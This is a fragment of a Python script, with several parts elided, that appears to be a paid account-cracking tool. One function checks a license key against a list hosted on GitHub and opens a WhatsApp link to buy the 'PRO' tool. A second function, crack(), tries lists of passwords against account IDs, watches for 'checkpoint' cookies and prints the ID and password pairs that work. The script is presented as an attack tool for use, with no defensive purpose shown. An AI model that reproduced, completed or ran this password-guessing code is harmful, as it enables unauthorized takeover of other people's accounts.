...
def Subscraption():
	...
	os.system('clear')
	banner()
	r1=requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
	if key1 in r1:
		os.system('clear')
		banner()
		menu()
		...
		print ("")
		print (" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Your Key : "+jisan+key1)
		print ("")
		
		input(" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m\033[1;32m Enter To Send Key")
		time.sleep(3.5)
		tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20PRO-Z%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+jisan+''+key1
		os.system('am start https://wa.me/+8801814649133?text=' + tks) 
		#Subscraption()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [HAMIM] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[HAMIM-OK💉] '+idf+ ' | '+pw+'')
